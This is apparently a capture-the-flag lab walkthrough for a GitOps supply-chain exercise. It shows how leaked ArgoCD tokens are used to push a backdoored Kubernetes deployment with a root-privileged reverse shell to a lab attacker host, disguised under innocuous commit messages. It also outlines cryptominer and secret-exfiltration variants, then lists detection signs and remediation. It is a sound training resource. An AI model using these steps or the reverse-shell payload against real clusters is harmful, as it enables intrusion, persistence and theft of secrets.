# Challenge 4: GitOps Pipeline Compromise - Attack Guide

**Difficulty**: Advanced  
**Prerequisites**: Completion of Challenge #2 (Container Image Layer Leak)  
**Learning Objectives**:
- Understanding GitOps security implications
- ArgoCD/Flux attack techniques  
- Kubernetes RBAC abuse
- GitOps-based backdoor injection
- Detection and prevention strategies

## Scenario

You've successfully extracted secrets from the container image in Challenge #2. Among the leaked credentials, you discovered ArgoCD deployment tokens that provide access to the production GitOps pipeline.

The organization uses ArgoCD to automatically deploy applications to production by syncing Kubernetes manifests from a Git repository. With the stolen credentials, you can:
- Modify production deployments
- Inject backdoors into running applications
- Deploy malicious workloads (cryptominers, data exfiltration pods)
- Establish persistent access to the production cluster

## Flag from Challenge #2

```
FLAG{l4y3r_l34k_g1t_h1st0ry:NEXT:g1t0ps_c0mpr0m1s3}
```

The flag hints at: `g1t0ps_c0mpr0m1s3` → GitOps compromise!

## Step 1: Extract ArgoCD Credentials

From Challenge #2, you should have extracted the `.env.production` file from the git history inside the container image.

**Review the credentials**:

```bash
# If you still have the extracted git history from Challenge 2
cd /path/to/extracted/.git
git show cb0d66f:.env.production
```

**Look for these lines**:
```env
# ArgoCD Production Deployment Credentials
ARGOCD_SERVER=argocd-server.argocd.svc.cluster.local
ARGOCD_AUTH_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJhZG1pbjpsb2dpbiIsIm5iZiI6MTcxMjMyMTQwMCwiaWF0IjoxNzEyMzIxNDAwLCJqdGkiOiJjdGYtZGVwbG95ZXIifQ.Q3RGX0RlcGxveV9Ub2tlbl9TdXBlclNlY3JldCE
ARGOCD_APP_NAME=recipe-api-production
ARGOCD_NAMESPACE=production
```

**What do these credentials provide?**
- `ARGOCD_SERVER`: ArgoCD API endpoint (internal cluster address)
- `ARGOCD_AUTH_TOKEN`: JWT token for authentication  
- `ARGOCD_APP_NAME`: Target application name
- `ARGOCD_NAMESPACE`: Production deployment namespace

## Step 2: Access ArgoCD

Since the ARGOCD_SERVER is an internal cluster address, we need to access ArgoCD through its external NodePort.

### 2.1 Install and Use ArgoCD CLI

```bash
# Install ArgoCD CLI (requires sudo)
sudo curl -sSL -o /usr/local/bin/argocd \
  https://github.com/argoproj/argo-cd/releases/latest/download/argocd-linux-amd64
sudo chmod +x /usr/local/bin/argocd

# Set the stolen token from .env.production
export ARGOCD_AUTH_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJhZG1pbjpsb2dpbiIsIm5iZiI6MTcxMjMyMTQwMCwiaWF0IjoxNzEyMzIxNDAwLCJqdGkiOiJjdGYtZGVwbG95ZXIifQ.Q3RGX0RlcGxveV9Ub2tlbl9TdXBlclNlY3JldCE'

# List applications using the token
argocd app list \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web
```

**Expected output**:
```
NAME                   CLUSTER  NAMESPACE   PROJECT  STATUS  HEALTH  SYNCPOLICY  CONDITIONS  REPO  PATH  TARGET
recipe-api-production  ...      production  ...      Synced  Healthy Auto        ...
```

## Step 3: Reconnaissance

Explore the current deployment to understand the attack surface.

### 3.1 Inspect ArgoCD Application

```bash
# Get application details using the stolen token
argocd app get recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web
```

**Key observations**:
- **Repo URL**: `http://gitea-http.gitea.svc.cluster.local:3000/sc-admin/production-manifests.git`
- **Path**: `recipe-api`
- **Auto-sync enabled**: Changes to Git are automatically deployed!

### 3.2 Inspect Current Deployment

As an attacker, you don't have direct kubectl access to the production cluster. However, ArgoCD provides visibility into the deployed resources:

```bash
# Get application resource details via ArgoCD
argocd app resources recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web

# Get detailed application manifest
argocd app manifests recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web
```

## Step 4: Choose Your Attack

You have multiple attack options. We'll demonstrate **Attack A: Backdoor Injection** (recommended for the deep dive).

### Attack Options

| Attack | Impact | Detection Difficulty | Recommended |
|--------|--------|---------------------|--------------|
| **A. Backdoor Injection** | High - Full control | Medium | ✅ Yes |
| **B. Cryptocurrency Miner** | Medium - Resource abuse | Low | Optional |
| **C. Data Exfiltration** | Critical - Secret theft | Medium | Optional |

## Step 5: Execute Attack A - Backdoor Injection

Modify the production deployment to inject a backdoor.

### 5.1 Clone the production-manifests Repository

```bash
# Clone from production Gitea (port 30004, not the CI cluster's 30002!)
git clone http://gitea-prod.sc.local:31080/sc-admin/production-manifests.git
cd production-manifests/recipe-api
```

### 5.2 Modify the Deployment

Edit `deployment.yaml` to inject malicious environment variables and commands:

```bash
# Backup original
cp deployment.yaml deployment.yaml.bak

# Apply the backdoored version
cp /path/to/supply-chain-dd/challenges/challenge4/attack-payloads/backdoored-deployment.yaml deployment.yaml
```

**Or manually add these changes**:

```yaml
spec:
  template:
    spec:
      containers:
      - name: recipe-api
        env:
        # ADD THESE MALICIOUS ENV VARS:
        - name: ENABLE_DEBUG_SHELL
          value: "true"
        - name: REVERSE_SHELL_HOST
          value: "attacker.sc.local"
        - name: REVERSE_SHELL_PORT
          value: "4444"
        
        # MODIFY command to inject backdoor:
        command: ["/bin/sh"]
        args:
          - -c
          - |
            ./recipe-api &
            if [ "$ENABLE_DEBUG_SHELL" = "true" ]; then
              nohup bash -c 'bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1' &
            fi
            wait
        
        # ESCALATE privileges:
        securityContext:
          runAsNonRoot: false
          runAsUser: 0
          allowPrivilegeEscalation: true
```

### 5.3 Commit and Push to Gitea

```bash
git add deployment.yaml
git commit -m "Update deployment resource configuration"
git push origin main
```

### 5.4 Watch ArgoCD Auto-Deploy

ArgoCD is configured with `auto-sync`, so it will automatically detect the Git change and deploy it!

```bash
# Watch the sync using the stolen token
argocd app watch recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web
```

**Within 1-2 minutes**, you should see:
- ArgoCD detects the Git change
- Pods are redeployed with the backdoored configuration
- New pods start with elevated privileges and the reverse shell

## Step 6: Verify the Backdoor

Verify the malicious configuration was deployed via ArgoCD:

```bash
# Check application sync status
argocd app get recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web

# View the deployed manifests to confirm backdoor is present
argocd app manifests recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web | grep -A 5 "REVERSE_SHELL"
```

**Expected output** should show the malicious environment variables and security context in the deployment manifest.

## Step 7: deep dive

The flag for this challenge is embedded in the ArgoCD application:

```bash
# Get application details to find the flag
argocd app get recipe-api-production \
  --auth-token="$ARGOCD_AUTH_TOKEN" \
  --server argocd.sc.local:31443 \
  --insecure \
  --grpc-web \
  -o yaml | grep -i flag

# Expected output:
FLAG{g1t0ps_pwn3d_pr0duct10n_c0mpr0m1s3d}
```

**Alternative**: The flag is also in the SETUP.md documentation as part of the challenge validation.

**🎉 Congratulations! You've completed Challenge 4!**

## Alternative Attacks (Optional)

### Attack B: Deploy Cryptocurrency Miner

```bash
cd production-manifests
git checkout main

# Copy the malicious pod
cp /path/to/supply-chain-dd/challenges/challenge4/attack-payloads/malicious-pod.yaml ./
git add malicious-pod.yaml
git commit -m "Add cache warming utility"
git push origin main

# ArgoCD will sync and deploy the "cache warmer" (actually a cryptominer)
```

### Attack C: Deploy Data Exfiltration CronJob

```bash
# Copy the exfil cronjob
cp /path/to/supply-chain-dd/challenges/challenge4/attack-payloads/data-exfil-cronjob.yaml ./
git add data-exfil-cronjob.yaml
git commit -m "Add automated backup utility"
git push origin main

# The CronJob will run every 5 minutes, stealing secrets
```

## What Made This Attack Possible?

1. **Leaked Credentials**: ArgoCD token in `.env.production` (Challenge 2)
2. **Excessive RBAC**: ArgoCD controller has `cluster-admin` privileges
3. **No Admission Policies**: Kyverno/OPA not enforcing pod security
4. **No Network Policies**: Pods can egress to any IP (reverse shells allowed)
5. **No Image Verification**: Unsigned images allowed
6. **Auto-Sync Enabled**: Git changes automatically deployed without review

## Detection Indicators

If defenders were monitoring, they might notice:

**Git Activity**:
- Unexpected commits to production-manifests
- Commits from unusual authors or times
- Suspicious commit messages

**Kubernetes Audit Logs**:
- Deployment modifications
- Elevated privilege requests
- Service account token usage

**Runtime Behavior (Falco)**:
- Reverse shell connections
- Processes spawning from containers
- High CPU usage (cryptomining)
- Outbound connections to unusual IPs

**ArgoCD Logs**:
- Sync operations at unusual times
- Application health changes

## Remediation

If you were a defender:

1. **Immediate**: Revoke all ArgoCD tokens
2. **Revert**: Git revert to last known-good commit
3. **Investigate**: Check audit logs, identify entry point
4. **Harden**: Apply security controls (see SECURITY-GUIDE.md)

## Learning Objectives Achieved

✅ Understood GitOps security implications  
✅ Exploited leaked ArgoCD credentials  
✅ Modified production deployments via Git  
✅ Injected backdoors into running applications  
✅ Demonstrated RBAC abuse  
✅ Understood detection challenges

## Next Steps

- **Understand the attack**: Read [ATTACK-ANALYSIS.md](./ATTACK-ANALYSIS.md)
- **Learn prevention**: Read [SECURITY-GUIDE.md](./SECURITY-GUIDE.md)
- **Apply security controls**: `make apply-challenge4-security`
- **Test that attacks are blocked**: `make test-challenge4-attack`

## References

- [ArgoCD Security Considerations](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/)
- [CNCF GitOps Principles](https://github.com/open-gitops/project)
- [Kubernetes RBAC Best Practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)
- [SolarWinds Supply Chain Attack](https://www.mandiant.com/resources/blog/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor)
